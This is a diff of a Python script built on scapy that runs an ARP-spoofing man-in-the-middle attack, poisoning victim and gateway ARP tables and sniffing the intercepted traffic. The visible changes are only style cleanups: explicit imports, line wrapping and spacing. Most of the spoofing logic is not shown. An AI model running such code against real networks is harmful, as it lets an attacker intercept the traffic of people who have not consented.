@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 import coloredlogs
 import logging
-from scapy.all import *
+from scapy.all import srp, Ether, ARP, send, IP, TCP, sendp, Raw, sniff
 import sys
 import os
 import time
@@ -31,7 +31,8 @@ os.system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward")  # nosec
 # Getting Mac Adresses #
 ########################
 def get_mac(IP):
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), iface=interface)
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),
+                     iface=interface)
     for snd, rcv in ans:
         return rcv[Ether].src
 
@@ -43,10 +44,13 @@ def reARP():
     logging.info("\n[*] Restoring Targets...")
     victimMAC = get_mac(victimIP)
     gateMAC = get_mac(gateIP)
-    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
-    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
+    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff",
+         hwsrc=victimMAC), count=7)
+    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff",
+         hwsrc=gateMAC), count=7)
     logging.info("[*] Shutting Down...")
     sys.exit(1)
+
 
 ########################
 # Tricking the Targets #
@@ -137,7 +141,7 @@ def mitm_main():
     try:
         t = multiprocessing.Process(target=trick,)
         t.start()
-        sniff(iface = interface, prn = set_packet) 
+        sniff(iface=interface, prn=set_packet)
     except KeyboardInterrupt:
         reARP()
 
